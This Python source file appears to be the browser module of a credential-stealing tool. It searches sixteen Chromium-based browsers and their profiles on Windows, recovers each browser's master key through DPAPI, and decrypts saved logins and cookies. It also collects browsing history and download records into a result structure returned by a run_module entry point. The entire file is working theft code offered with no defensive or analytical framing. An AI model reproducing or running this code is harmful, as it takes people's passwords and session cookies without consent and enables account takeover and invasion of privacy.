from typing import Any
import base64
import json
import os
import shutil
import sqlite3

from Cryptodome.Cipher import AES
from pydantic import BaseModel
from win32crypt import CryptUnprotectData


class Login(BaseModel):
    url: str
    username: str
    password: str


class Cookie(BaseModel):
    host: str
    name: str
    path: str
    value: str
    expires: str


class WebHistory(BaseModel):
    url: str
    title: str
    timestamp: str


class Download(BaseModel):
    tab_url: str
    target_path: str


class Browsers:
    MODULE_NAME = "browsers"

    @classmethod
    def run_module(cls) -> dict[str, Any]:
        return Chromium().return_result()


class Chromium:
    def return_result(self) -> dict[str, Any]:
        return self.res

    def __init__(self) -> None:
        self.res: dict[str, Any] = {}

        self.appdata = os.getenv("LOCALAPPDATA")

        # If inaccessible, don't make assumptions and just quit immediately
        if not self.appdata:
            self.res = {}
            return

        self.browsers = {
            "amigo": self.appdata + "\\Amigo\\User Data",
            "torch": self.appdata + "\\Torch\\User Data",
            "kometa": self.appdata + "\\Kometa\\User Data",
            "orbitum": self.appdata + "\\Orbitum\\User Data",
            "cent-browser": self.appdata + "\\CentBrowser\\User Data",
            "7star": self.appdata + "\\7Star\\7Star\\User Data",
            "sputnik": self.appdata + "\\Sputnik\\Sputnik\\User Data",
            "vivaldi": self.appdata + "\\Vivaldi\\User Data",
            "google-chrome-sxs": self.appdata + "\\Google\\Chrome SxS\\User Data",
            "google-chrome": self.appdata + "\\Google\\Chrome\\User Data",
            "epic-privacy-browser": self.appdata + "\\Epic Privacy Browser\\User Data",
            "microsoft-edge": self.appdata + "\\Microsoft\\Edge\\User Data",
            "uran": self.appdata + "\\uCozMedia\\Uran\\User Data",
            "yandex": self.appdata + "\\Yandex\\YandexBrowser\\User Data",
            "brave": self.appdata + "\\BraveSoftware\\Brave-Browser\\User Data",
            "iridium": self.appdata + "\\Iridium\\User Data",
        }
        self.profiles = [
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
        ]

        for name, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f"{path}\\Local State")
            if not self.master_key:
                continue

            self.res[name] = {}

            for profile in self.profiles:
                if not os.path.exists(path + "\\" + profile):
                    continue

                self.res[name][profile] = {}

                operations = {
                    "logins": self.get_login_data,
                    "cookies": self.get_cookies,
                    "history": self.get_web_history,
                    "downloads": self.get_downloads,
                }

                for datatype, operation in operations.items():
                    try:
                        self.res[name][profile][datatype] = operation(path, profile)
                    except Exception as e:
                        print(e)
                        pass

    def get_master_key(self, path: str) -> bytes | None:
        if not os.path.exists(path):
            return None

        if "os_crypt" not in open(path, "r", encoding="utf-8").read():
            return None

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        dec_pass = decrypted_pass[:-16].decode()

        return dec_pass

    def get_login_data(self, path: str, profile: str) -> list[dict]:
        res: list[dict] = []
        login_db = f"{path}\\{profile}\\Login Data"
        if not os.path.exists(login_db):
            return res

        shutil.copy(login_db, "login_db")
        conn = sqlite3.connect("login_db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            assert self.master_key is not None
            password = self.decrypt_password(row[2], self.master_key)
            res.append(
                Login(url=row[0], username=row[1], password=password).model_dump()
            )

        conn.close()
        os.remove("login_db")

        return res

    def get_cookies(self, path: str, profile: str) -> list[dict]:
        res: list[dict] = []
        cookie_db = f"{path}\\{profile}\\Network\\Cookies"
        if not os.path.exists(cookie_db):
            return res

        try:
            shutil.copy(cookie_db, "cookie_db")
            conn = sqlite3.connect("cookie_db")
            cursor = conn.cursor()
            cursor.execute(
                "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies"
            )
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                assert self.master_key is not None
                cookie = self.decrypt_password(row[3], self.master_key)
                res.append(
                    Cookie(
                        host=row[0],
                        name=row[1],
                        path=row[2],
                        value=cookie,
                        expires=row[4],
                    ).model_dump()
                )

            conn.close()
        except Exception as e:
            print(e)

        os.remove("cookie_db")
        return res

    def get_web_history(self, path: str, profile: str) -> list[dict]:
        res: list[dict] = []

        web_history_db = f"{path}\\{profile}\\History"
        if not os.path.exists(web_history_db):
            return res

        shutil.copy(web_history_db, "web_history_db")
        conn = sqlite3.connect("web_history_db")
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            res.append(
                WebHistory(url=row[0], title=row[1], timestamp=row[2]).model_dump()
            )

        conn.close()
        os.remove("web_history_db")

        return res

    def get_downloads(self, path: str, profile: str) -> list[dict]:
        res: list[dict] = []

        downloads_db = f"{path}\\{profile}\\History"
        if not os.path.exists(downloads_db):
            return res

        shutil.copy(downloads_db, "downloads_db")
        conn = sqlite3.connect("downloads_db")
        cursor = conn.cursor()
        cursor.execute("SELECT tab_url, target_path FROM downloads")
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            res.append(Download(tab_url=row[0], target_path=row[1]).model_dump())

        conn.close()
        os.remove("downloads_db")

        return res
